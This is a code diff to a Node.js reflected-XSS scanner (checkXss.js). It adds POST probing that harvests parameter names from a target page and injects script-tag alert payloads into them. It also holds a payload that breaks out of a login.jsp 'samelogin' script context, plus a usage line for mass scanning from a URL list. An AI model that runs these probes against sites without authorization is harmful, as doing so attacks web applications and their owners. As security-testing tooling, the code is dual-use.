@@ -4,7 +4,7 @@ var EventEmitter = require('events').EventEmitter,
 	program = require('commander'),
 	maxSockets = 333,
 	mylen = 180,
-	timeout = 2000,
+	timeout = 10000,
 	n_maxLs = maxSockets;
 
 EventEmitter.prototype._maxListeners = n_maxLs;
@@ -31,7 +31,7 @@ program.version("parse webshell urls 1.0")
 			.option('-v, --verbose', 'show logs')
 			.on('--help',function()
 			{
-				console.log("\n\ncat /tmp/u.txt|xargs -I % node tools/checkXss.js -v -u %\n\n");
+				console.log("\n\ncat /mysvn/new_url_list.txt|xargs -I % node tools/checkXss.js -v -u %\n\n");
 			})
             .parse(process.argv);
 mylen = program.len || mylen;
@@ -71,26 +71,90 @@ mylen = program.len || mylen;
 "}alert(2);if(1){//
 ");}alert(1);{//
 */
+var xss_wt = fs.readFileSync("tools/xss_whitelist.txt").toString("utf-8");
+function fnDoReq(req,opt,fnCbk)
+{
+	var o = {
+		method: 'POST',
+		"content-type":"application/x-www-form-urlencoded",
+		"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; OPPO A33 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043409 Safari/537.36 V1_AND_SQ_7.1.8_718_YYB_D PA QQ/7.1.8.3240 NetType/4G WebP/0.3.0 Pixel/540"
+	};
+	for(var k in opt)
+	{
+		o[k] = opt[k];
+	}
+	req.post(o,function(e,r,b)
+	{
+		if(!e && b)
+		{
+			fnCbk(String(b));
+		}
+	});
+}
+
+function fnInfo(url,ss,i)
+{
+	console.log("found XSS: " + url);
+	if(program && program.verbose)
+	{
+		console.log(ss.substr(i - mylen, mylen * 1.5))
+	}
+}
 if(program.url)
 {
 	var url = program.url,szOurl = url, req = fnGetRequest(request),  s = "<script>alert(" + new Date().getTime() + ")</script>";
+	// 寻找注入点
+	fnDoReq(req,{uri:url,
+		},function(b)
+		{
+			if(b)
+			{
+				var  b = String(b), re1 = new RegExp("(\\b"+ xss_wt.trim().replace(/[^a-z\n]/gmi,'').replace(/\n{1,}/gmi,'\n').replace(/\n/gmi, "\\b)|(\\b") +"\\b)","gmi");
+				// console.log(re1)
+				b = b.replace(re1,'');
+				// console.log(b)
+				if(b)
+				{
+					var re = /(\b[a-z]+\b)/gmi,aP = [],oG={};
+					while(ss = re.exec(b))
+					{
+						if(!oG[ss[1]])
+							oG[ss[1]]=1,aP.push(ss[1]);
+					}
+					// 这些都需要进行XSS的测试
+					if(0 < aP.length)
+					{
+						myXss = aP.join("=" + encodeURIComponent(s) + "&");
+						// console.log(myXss);
+						fnDoReq(req,{uri:url,
+							body:myXss
+							},function(b)
+						{
+							var i = 0;
+							if(-1 < (i = b.indexOf(s)))
+							{
+								fnInfo(url,b,i);
+							}
+						});
+					}
+					
+				}
+			}
+		});
+	
 	if(/\/[^\/\.]+$/gmi.test(url))
 		url += "/";
 	url = url.replace(/\/[^\/]*$/gmi, "/") + "login.jsp?samelogin=" + encodeURIComponent("null\";</script>" + s);
 	
 
-	req.get(url,function(e,r,b)
+	fnDoReq(req,{uri:url},function(b)
 	{
-		if(!e && b)
+		if(b)
 		{
 			var ss = String(b), i = 0;
 			if(-1 < (i = ss.indexOf(s)))
 			{
-				console.log("found XSS: " + szOurl);
-				if(program && program.verbose)
-				{
-					console.log(ss.substr(i - mylen, mylen * 1.5))
-				}
+				fnInfo(szOurl,ss,i);
 			}
 		}
 	});
